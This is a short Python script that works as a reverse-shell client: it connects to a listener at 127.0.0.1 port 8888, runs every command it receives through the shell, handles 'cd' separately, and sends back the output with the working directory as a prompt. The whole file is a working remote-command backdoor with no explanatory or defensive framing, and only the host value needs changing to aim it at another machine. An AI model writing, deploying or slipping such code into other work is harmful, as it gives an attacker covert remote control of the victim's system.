#!/usr/bin/env python
# coding:utf-8

import os
import socket
import subprocess

s = socket.socket()
host = '127.0.0.1'
port = 8888

s.connect((host,port))

while 1:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data.decode("utf-8"),shell=True,stdout=subprocess.PIPE)
        output_bytes = cmd.stdout.read()
        output_str = str(output_bytes,'gbk')
        s.send(str.encode(output_str + str(os.getcwd()) + '>'))
        print(output_str)


# Close connection
s.close()